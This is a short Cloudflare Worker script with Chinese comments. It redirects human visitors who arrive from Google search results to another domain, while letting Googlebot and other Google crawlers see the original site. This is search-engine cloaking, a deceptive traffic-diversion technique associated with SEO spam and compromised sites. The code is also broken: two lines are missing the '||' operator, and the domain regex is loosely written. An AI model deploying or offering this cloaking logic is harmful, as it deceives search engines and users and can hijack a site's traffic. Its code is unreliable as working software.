export default {
  async fetch(request, env) {
    const referer = request.headers.get('referer')  '';
    const userAgent = request.headers.get('user-agent')  '';

    // 仅跳转来自Google搜索结果的访问（Referer包含google.com/search）
    const isGoogleSearchClick = /https?:\/\/(www\.)?google\.(com|.[a-z]{2,3})\/search\?/i.test(referer);

    // 放行Google爬虫（不跳转）
    const isGoogleBot = /Googlebot|AdsBot-Google|Mediapartners-Google/i.test(userAgent);

    if (isGoogleSearchClick && !isGoogleBot) {
      // 跳转到新网站（301永久重定向）
      return Response.redirect('https://new-website.com', 301);
    }

    // 其他情况（直接访问、爬虫、非Google搜索流量）正常访问原网站
    return fetch(request);
  }
};
